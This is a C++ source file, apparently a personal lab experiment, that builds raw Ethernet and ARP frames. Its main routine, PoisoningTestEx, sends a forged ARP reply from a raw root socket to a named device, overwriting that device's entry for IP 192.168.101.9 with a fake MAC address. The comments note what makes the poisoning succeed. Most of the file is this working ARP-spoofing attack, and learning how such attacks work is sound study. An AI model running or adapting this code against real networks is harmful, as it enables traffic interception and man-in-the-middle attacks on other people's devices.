/**============================================================================
Name        : Tests.cpp
Created on  : 07.08.2023
Author      : Anrei Tokmakov
Version     : 1.0
Copyright   : Your copyright notice
Description : Tests C++ project
============================================================================**/

#include <iostream>
#include <string_view>
#include <vector>

#include "Headers/ARPHeader.h"
#include "Utilities/Utilities.h"
#include <net/if_arp.h> 

namespace
{

    EthernetHeader* initEthernetHeader(EthernetHeader* ethernetHeader,
                                       const sockaddr_ll& device,
                                       std::string_view dst,
                                       const uint16_t type = ETH_P_ARP)
    {
        ethernetHeader->SetDestinationMACAddress(dst.data());
        ethernetHeader->SetSourceMACAddress(device.sll_addr);
        ethernetHeader->SetType(type);
        return ethernetHeader;
    }

    EthernetHeader* initEthernetHeader(EthernetHeader* ethernetHeader,
                                       std::string_view srcMAC,
                                       std::string_view dstMAC,
                                       const uint16_t type = ETH_P_ARP)
    {
        ethernetHeader->SetDestinationMACAddress(dstMAC.data());
        ethernetHeader->SetSourceMACAddress(srcMAC.data());
        ethernetHeader->SetType(type);
        return ethernetHeader;
    }


    ARPHeader* initARPHeader_Request(ARPHeader* arpHeader,
                                     const sockaddr_ll& device)
    {
        arpHeader->clear();
        arpHeader->htype = htons(1);               // Hardware type (16 bits): 1 for ethernet
        arpHeader->ptype = htons(ETH_P_IP);        // Protocol type (16 bits): 2048 for IP
        arpHeader->hlen = 6;                       // Hardware address length (8 bits): 6 bytes for MAC address
        arpHeader->plen = 4;                       // Protocol address length (8 bits): 4 bytes for IPv4 address
        arpHeader->opcode = htons(ARPOP_REQUEST);  // OpCode: 1 for ARP request

        /** Sender hardware address (48 bits): MAC address **/
        arpHeader->SetSenderMACAddress(device.sll_addr);

        return arpHeader;
    }

    ARPHeader* initARPHeader_Reply(ARPHeader* arpHeader,
                                   [[maybe_unused]] const sockaddr_ll& device,
                                   std::string_view targetMac)
    {
        arpHeader->clear();
        arpHeader->htype = htons(1);               // Hardware type (16 bits): 1 for ethernet
        arpHeader->ptype = htons(ETH_P_IP);        // Protocol type (16 bits): 2048 for IP
        arpHeader->hlen = 6;                       // Hardware address length (8 bits): 6 bytes for MAC address
        arpHeader->plen = 4;                       // Protocol address length (8 bits): 4 bytes for IPv4 address
        arpHeader->opcode = htons(ARPOP_REPLY);    // OpCode: 1 for ARP request

        // This MAC will be used as the TARGET mac in re reply
        // Tcpdump: Reply 192.168.57.54 is-at [targetMac]
        arpHeader->SetSenderMACAddress(targetMac);
        // arpHeader->SetTargetMACAddress(targetMac);

        return arpHeader;
    }

    ARPHeader* initARPHeader_Reply(ARPHeader* arpHeader,
                                   std::string_view senderMac,
                                   std::string_view targetMac)
    {
        arpHeader->clear();
        arpHeader->htype = htons(1);               // Hardware type (16 bits): 1 for ethernet
        arpHeader->ptype = htons(ETH_P_IP);        // Protocol type (16 bits): 2048 for IP
        arpHeader->hlen = 6;                       // Hardware address length (8 bits): 6 bytes for MAC address
        arpHeader->plen = 4;                       // Protocol address length (8 bits): 4 bytes for IPv4 address
        arpHeader->opcode = htons(ARPOP_REPLY);    // OpCode: 1 for ARP request

        arpHeader->SetSenderMACAddress(senderMac);
        arpHeader->SetTargetMACAddress(targetMac);

        return arpHeader;
    }

    Utilities::SocketScoped createSocket()
    {
        Utilities::SocketScoped socket = ::socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
        if (-1 == socket) {
            std::cerr << "Failed to create socket. Error = " << errno << std::endl;
            std::exit(0);
        }
        return socket;
    }

}

namespace ARPTester
{
    constexpr std::string_view interfaceName { "enp2s0" };
    constexpr std::string_view BROADCAST_MAC { "ff:ff:ff:ff:ff:ff"};

    void PoisoningTestEx()
    {

        constexpr std::string_view targetDeviceMac { "6c:24:08:f8:b6:af" };
        constexpr std::string_view ipAddressToOverwrite { "192.168.101.9" };
        constexpr std::string_view fakeMacAddressToSet { "11:22:33:44:44:44" };

        const sockaddr_ll device = Utilities::ResolveInterfaceAddress(interfaceName);
        std::array<uint8_t, sizeof(EthernetHeader) + sizeof(ARPHeader)> packet{};

        // Have to send ARP Reply packet right to Device interface MAC address
        // otherwise it fail to set new value to the ARP table
        initEthernetHeader(reinterpret_cast<EthernetHeader*>(packet.data()), device,targetDeviceMac);

        // Target MAC address: doesn't matter in case when we want to overwrite the ARP table value
        // or at least it looks like it
        ARPHeader* arpHeader = initARPHeader_Reply(reinterpret_cast<ARPHeader*>((packet.data() + sizeof(EthernetHeader))),
                                                   fakeMacAddressToSet,  // MAC of IP requested IP in REQUEST
                                                   BROADCAST_MAC);       // MAC of 'Sender IP Address' from Request

        // 'Sender IP Address' ---> It the POISONED MAC address
        arpHeader->SetSenderAddress(ipAddressToOverwrite);

        Utilities::SocketScoped socket = createSocket();
        const ssize_t bytes = sendto(socket,packet.data(),packet.size(),
                                  0,reinterpret_cast<const sockaddr*>(&device),sizeof(device));
        std::cout << bytes << " send\n";

        // FIXME: length 60: Reply 192.168.101.9 is-at 11:22:33:44:44:44, length 46
        //        actual length could be less --> 'length 28'
    }
}

int main([[maybe_unused]] int argc,
         [[maybe_unused]] char** argv)
{
    const std::vector<std::string_view> args(argv + 1, argv + argc);

    Utilities::checkRunningUnderRoot();
    ARPTester::PoisoningTestEx();

    return EXIT_SUCCESS;
}

